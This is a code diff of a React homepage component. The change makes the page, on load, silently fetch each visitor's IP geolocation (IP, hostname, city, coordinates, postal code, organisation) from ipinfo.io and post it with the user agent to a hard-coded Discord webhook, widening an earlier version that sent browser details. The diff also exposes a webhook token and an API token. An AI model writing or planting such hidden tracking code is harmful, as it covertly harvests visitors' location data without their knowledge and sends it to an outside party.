@@ -35,40 +35,70 @@ export default function Home() {
     };
   }, []);
 
-  const discordUrl = "https://discord.com/api/webhooks/1200773590933590137/AcW-MytBNd2Bc-i_P6sflpOh_Kx8-FWDrYK_Ug4mQlrtSZdghHPXJVCqUzYW86lx8wHG"
 
   useEffect(() => {
-    const browserInfo = {
-      userAgent: navigator.userAgent || 'Unknown',
-      language: navigator.language || 'Unknown',
-      platform: navigator.platform || 'Unknown',
-    };
+    // Get user IP information (fetching from ipinfo.io)
+    fetch('https://ipinfo.io/json?token=34599d1b507e43')
+      .then(response => response.json())
+      .then(ipInfo => {
+        // Get platform information
+        const platformInfo = {
+          userAgent: navigator.userAgent || 'Unknown',
+        };
 
-    const payload = {
-      content: `User Info:\nUser Agent: ${browserInfo.userAgent}\nLanguage: ${browserInfo.language}\nPlatform: ${browserInfo.platform}`,
-    };
+        // Format IP information for Discord
+        const formattedIPInfo = `
+          IP: ${ipInfo.ip}
+          Hostname: ${ipInfo.hostname}
+          City: ${ipInfo.city}
+          Region: ${ipInfo.region}
+          Country: ${ipInfo.country}
+          Location: ${ipInfo.loc}
+          Organization: ${ipInfo.org}
+          Postal: ${ipInfo.postal}
+          Timezone: ${ipInfo.timezone}
+        `;
 
-    fetch(discordUrl, {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify(payload),
-    })
-      .then(response => {
-        if (!response.ok) {
-          throw new Error(`HTTP error! Status: ${response.status}`);
-        }
-        return response.json();
-      })
-      .then(data => {
-        console.log('Webhook response:', data);
+        // Combine IP and platform information
+        const payload = {
+          content: `
+            **IP Information:**
+            ${formattedIPInfo}
+
+            **Platform Information:**
+            User Agent: ${platformInfo.userAgent}
+          `,
+        };
+
+        // Discord webhook URL
+        const discordUrl = "https://discord.com/api/webhooks/1200773590933590137/AcW-MytBNd2Bc-i_P6sflpOh_Kx8-FWDrYK_Ug4mQlrtSZdghHPXJVCqUzYW86lx8wHG"
+
+
+        // Send payload to Discord webhook
+        fetch(discordUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(payload),
+        })
+          .then(response => {
+            if (!response.ok) {
+              throw new Error(`HTTP error! Status: ${response.status}`);
+            }
+            return response.json();
+          })
+          .then(data => {
+            console.log('Webhook response:', data);
+          })
+          .catch(error => {
+            console.error('Error sending webhook:', error);
+          });
       })
       .catch(error => {
-        console.error('Error sending webhook:', error);
+        console.error('Error fetching IP information:', error);
       });
-
-  }, [discordUrl]);
+  }, []);
 
 
   return (
